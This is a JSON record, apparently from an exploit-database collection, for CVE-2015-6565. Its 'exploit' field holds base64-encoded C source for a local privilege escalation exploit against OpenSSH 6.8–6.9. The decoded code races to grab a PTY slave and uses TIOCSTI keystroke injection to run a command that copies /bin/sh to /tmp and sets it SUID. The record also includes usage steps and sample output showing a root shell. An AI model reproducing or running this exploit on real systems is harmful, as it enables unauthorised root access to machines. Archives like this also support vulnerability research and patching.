{
    "source": "exploit-database", 
    "exploit": "LyogDQogKiAgbm90X2FuX3NzaG51a2UuYw0KICoNCiAqICBGZWRlcmljbyBCZW50bw0KICoNCiAqICB1cDIwMTQwNzg5MCAoKSBhbHVub3MgZGNjIGZjIHVwIHB0DQogKiAgaHR0cHM6Ly90d2l0dGVyLmNvbS91aWQxMDAwDQogKiANCiAqICBPcGVuU1NIIDYuOC02LjkgbG9jYWwgcHJpdmlsZWdlIGVzY2FsYXRpb24gLSBDVkUtMjAxNS02NTY1DQogKiAgDQogKiAgQ29uc2lkZXJlZCBtb3N0bHkgdG8gYmUgYSAiRG9TIiwgdHVybnMgb3V0IHRvIGJlIGEgcHJpdiBlc2MgdnVsbi4NCiAqICBodHRwczovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNWRS0yMDE1LTY1NjUNCiAqDQogKiAgU2hvdXR6IHRvIEphbm4gSG9ybiBmb3IgdGhlIGRldGFpbGVkIGFuYWx5c2lzDQogKiAgQW5kIGFsc28gdG8gYWxsIG15IGVsaXRlIGNvbGxlYWd1ZXMsIHNwZWNpYWxseSB4U1RGIDopDQogKg0KICoNCiAqICAkIGdjYyBub3RfYW5fc3NobnVrZS5jIC1vIG5vdF9hbl9zc2hudWtlDQogKiAgJCAuL25vdF9hbl9zc2hudWtlIC9kZXYvcHRzLzMNCiAqICBbKl0gV2FpdGluZyBmb3Igc2xhdmUgZGV2aWNlIC9kZXYvcHRzLzMNCiAqICBbK10gR290IFBUWSBzbGF2ZSAvZGV2L3B0cy8zDQogKiAgWytdIE1ha2luZyBQVFkgc2xhdmUgdGhlIGNvbnRyb2xsaW5nIHRlcm1pbmFsDQogKiAgWytdIFNVSUQgc2hlbGwgYXQgL3RtcC9zaA0KICogICQgL3RtcC9zaCAtLW5vcmMgLS1ub3Byb2ZpbGUgLXANCiAqICAjIGlkDQogKiAgZXVpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpDQogKg0KICovDQoNCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4NCiAgICAgDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICAgICBjaGFyICpjbWQgPSAiY3AgL2Jpbi9zaCAvdG1wL3NoOyBjaG1vZCB1K3MgL3RtcC9zaFxuIjsNCiAgICAgaW50IHBpZCwgcHRzID0gLTE7DQoNCiAgICAgaWYoYXJnYyAhPSAyKSB7DQogICAgICAgICAgZnByaW50ZihzdGRlcnIsICJVc2FnZTogJXMgL2Rldi9wdHMvWFxuIiwgYXJndlswXSk7DQoJICBmcHJpbnRmKHN0ZGVyciwgIldoZXJlIFggaXMgbmV4dCBzbGF2ZSBkZXZpY2UgdG8gYmUgY3JlYXRlZFxuIik7DQoJICByZXR1cm4gMTsNCiAgICAgfQ0KCQ0KICAgICBpZighYWNjZXNzKGFyZ3ZbMV0sIEZfT0spKSB7DQogICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gJXMgZGV2aWNlIGFscmVhZHkgZXhpc3RzXG4iLCBhcmd2WzFdKTsNCiAgICAgICAgICByZXR1cm4gMTsNCiAgICAgfQ0KDQogICAgIHBpZCA9IGZvcmsoKTsNCg0KICAgICBpZihwaWQgPCAwKSB7DQoJICBmcHJpbnRmKHN0ZGVyciwgIlstXSBmb3JrIGZhaWxlZFxuIik7DQoJICByZXR1cm4gMTsNCiAgICAgfQ0KCQ0KICAgICBpZihwaWQgPT0gMCkgew0KICAgICAgICAgIHByaW50ZigiWypdIFdhaXRpbmcgZm9yIHNsYXZlIGRldmljZSAlc1xuIiwgYXJndlsxXSk7DQoJCQ0KCSAgLyogd2luIHRoZSByYWNlIGJ5IG9wZW5pbmcgdGhlIFBUWSBzbGF2ZSBiZWZvcmUgc3NoZCdzIGNoaWxkICovDQoJICB3aGlsZShwdHMgPT0gLTEpDQoJICAgICAgIHB0cyA9IG9wZW4oYXJndlsxXSwgT19XUk9OTFkpOyANCg0KCSAgICAgICBwcmludGYoIlsrXSBHb3QgUFRZIHNsYXZlICVzXG4iLCBhcmd2WzFdKTsNCiAgICAgICAgICAgICAgIHByaW50ZigiWytdIE1ha2luZyBQVFkgc2xhdmUgdGhlIGNvbnRyb2xsaW5nIHRlcm1pbmFsXG4iKTsNCgkJDQoJICAgICAgIGR1cDIocHRzLCAwKTsgZHVwMihwdHMsIDEpOyBkdXAyKHB0cywgMik7DQoJICAgICAgIHNldHNpZCgpOw0KICAgICAgICAgICAgICAgaW9jdGwoMCwgVElPQ1NDVFRZLCAxKTsNCg0KCSAgICAgICB3aGlsZSgqY21kKQ0KCSAgICAgICAgICAgIGlvY3RsKDAsIFRJT0NTVEksIGNtZCsrKTsNCiAgICAgfQ0KDQogICAgIGVsc2Ugew0KICAgICAgICAgIHdhaXQoTlVMTCk7DQoJICBwcmludGYoIlsrXSBTVUlEIHNoZWxsIGF0IC90bXAvc2hcbiIpOw0KCSAgcmV0dXJuIDA7DQogICAgIH0NCn0=", 
    "filename": "platforms/linux/local/41173.c", 
    "id": "41173", 
    "cves": [
        "CVE-2015-6565"
    ]
}